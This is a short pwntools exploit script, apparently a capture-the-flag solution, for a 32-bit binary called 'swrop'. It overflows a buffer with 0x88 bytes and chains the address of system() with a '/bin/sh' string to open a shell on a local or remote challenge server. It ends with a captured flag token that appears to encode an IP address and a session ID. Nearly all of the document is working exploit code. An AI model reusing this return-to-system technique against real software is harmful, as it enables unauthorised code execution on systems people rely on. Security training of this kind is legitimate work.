#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./swrop"    

    context.arch = 'i386'
    context.terminal = ['urxvtc', '-e', 'sh', '-c']

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 6001

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

start()

# Overflow the buffer with 0x88 bytes, and take the addresses of the gadgets from the "hidden" function not_call()
payload = b"A" * 0x88
payload += p32(0x080484ed)  # address of system() in not_call
payload += p32(0x080485f0)  # address of /bin/sh

p.sendlineafter(">", payload)

p.interactive()
p.close()

# flag = FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1zd3JvcCIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiZGRmZGFlODAtNDNkZi00NjU2LWFhNjItYTJjOGYyZjdlYWM5In0.gYrTvPGNX_vt--Uu4q8QU3dje7Nb3HPxbk6DRx-HNzQ}